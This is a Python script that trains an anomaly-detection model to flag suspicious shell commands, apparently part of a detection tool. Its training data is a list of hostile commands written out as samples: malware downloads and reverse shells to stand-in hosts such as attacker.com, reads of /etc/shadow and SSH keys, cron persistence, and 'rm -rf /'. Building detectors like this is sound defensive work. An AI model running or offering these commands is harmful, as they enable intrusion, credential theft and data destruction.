import os
import pickle
import sys

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from feature_engineering.feature_builder import FeatureBuilder

MODEL_DIR = os.path.dirname(__file__)
MODEL_PATH = os.path.join(MODEL_DIR, "isolation_model.pkl")
VECTORIZER_PATH = os.path.join(MODEL_DIR, "vectorizer.pkl")

def get_training_data():
    # Normal commands (expanded)
    normal_cmds = [
        "ls -l /var/log", "top -b -n 1", "ps aux", "grep -r error /app/logs", 
        "whoami", "date", "netstat -tuln", "pwd", "tail -n 100 /var/log/syslog",
        "echo alive", "cat /app/config.json", "python worker.py", "nginx -g 'daemon off;'",
        "node server.js", "npm start", "curl http://localhost:8080/health"
    ] * 60

    # Anomalies - A wide array of legitimate commands used for Living Off the Land (LOTL)
    attack_cmds = [
        "cat /etc/shadow", 
        "chmod 777 /tmp/malware.sh", 
        "curl http://attacker.com/malware.sh -o /tmp/malware.sh",
        "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'",
        "wget http://evil.com/payload",
        "nc -e /bin/sh 10.0.0.1 4444",
        "cat /etc/passwd",
        "find / -name id_rsa",
        "awk -F: '($3 == 0) {print $1}' /etc/passwd",
        "tar -czvf /tmp/backup.tar.gz /home/user/.ssh",
        "nslookup attacker-c2-domain.com",
        "ping -c 1 malicious-ip.com",
        "crontab -e",
        "echo '* * * * * root /tmp/malware.sh' >> /etc/crontab",
        "ssh root@10.0.0.5 'rm -rf /'",
        "tcpdump -i eth0 -w /tmp/capture.pcap",
        "strace -p 1234",
        "iptables -F"
    ]
    
    return normal_cmds + attack_cmds

def train():
    from sklearn.ensemble import IsolationForest
    print("Gathering advanced training data...")
    commands = get_training_data()
    
    print("Building extended features...")
    fb = FeatureBuilder()
    fb.fit(commands)
    X = fb.transform(commands)
    
    # Increase contamination slightly to account for wider attack surface
    model = IsolationForest(contamination=0.06, random_state=42)
    model.fit(X)
    
    with open(MODEL_PATH, "wb") as f:
        pickle.dump(model, f)
    with open(VECTORIZER_PATH, "wb") as f:
        pickle.dump(fb.vectorizer, f)
        
    print(f"Advanced Models saved successfully to {MODEL_DIR}")

if __name__ == "__main__":
    train()
